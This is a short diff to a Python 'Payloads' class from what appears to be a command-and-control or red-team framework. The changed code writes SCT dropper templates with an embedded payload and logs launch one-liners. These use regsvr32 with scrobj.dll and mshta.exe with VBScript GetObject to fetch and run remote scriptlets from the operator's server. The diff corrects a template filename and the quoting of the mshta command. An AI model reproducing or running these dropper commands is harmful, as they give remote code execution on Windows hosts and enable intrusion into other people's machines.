@@ -294,7 +294,7 @@ class Payloads(object):
     def CreateSCT(self, name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.FirstURL}/{self.QuickCommand}_rg")
-        with open("%s%sdropper_cs.sct" % (PayloadTemplatesDirectory, name), 'r') as f:
+        with open("%s%sdropper_rg.sct" % (PayloadTemplatesDirectory, name), 'r') as f:
             content = f.read()
         content = str(content) \
             .replace("#REPLACEME#", self.CreateRawBase())
@@ -302,7 +302,7 @@ class Payloads(object):
             f.write(content)
 
         self.QuickstartLog(Colours.END)
-        self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % f"{self.FirstURL}/{self.QuickCommand}_cs")
+        self.QuickstartLog("mshta.exe 'vbscript:GetObject(\"script:%s\")(window.close)'" % f"{self.FirstURL}/{self.QuickCommand}_cs")
         with open("%s%sdropper_cs.sct" % (PayloadTemplatesDirectory, name), 'r') as f:
             content = f.read()
         content = str(content) \
